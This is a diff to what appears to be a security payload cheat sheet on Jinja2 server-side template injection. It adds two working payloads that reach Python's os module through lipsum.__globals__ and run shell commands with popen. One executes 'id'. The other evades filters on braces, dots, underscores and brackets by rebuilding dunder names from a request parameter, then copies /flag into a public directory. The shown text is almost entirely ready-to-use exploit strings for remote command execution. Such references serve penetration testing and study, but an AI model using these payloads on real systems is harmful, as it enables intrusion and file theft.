@@ -224,6 +224,7 @@ With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a pa
 
 ```python
 {{ lipsum.__globals__["os"].popen('id').read() }}
+{{ lipsum.__globals__.__getitem__('os').popen('id').read() }}
 ```
 
 #### Exploit The SSTI By Calling subprocess.Popen
@@ -297,6 +298,12 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@Se
 
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+Bypassing ["{{", "}}", ".", "_", "[", "]","\\", "x"]
+
+```python
+{% set s = lipsum|attr((request|attr('args')|attr('get')('u')*2,'globals',request|attr('args')|attr('get')('u')*2)|join)|attr((request|attr('args')|attr('get')('u')*2,'getitem',request|attr('args')|attr('get')('u')*2)|join)('os')|attr('popen')('cat /flag > /app/public/flag') %}&u=_
 ```
 
 ---
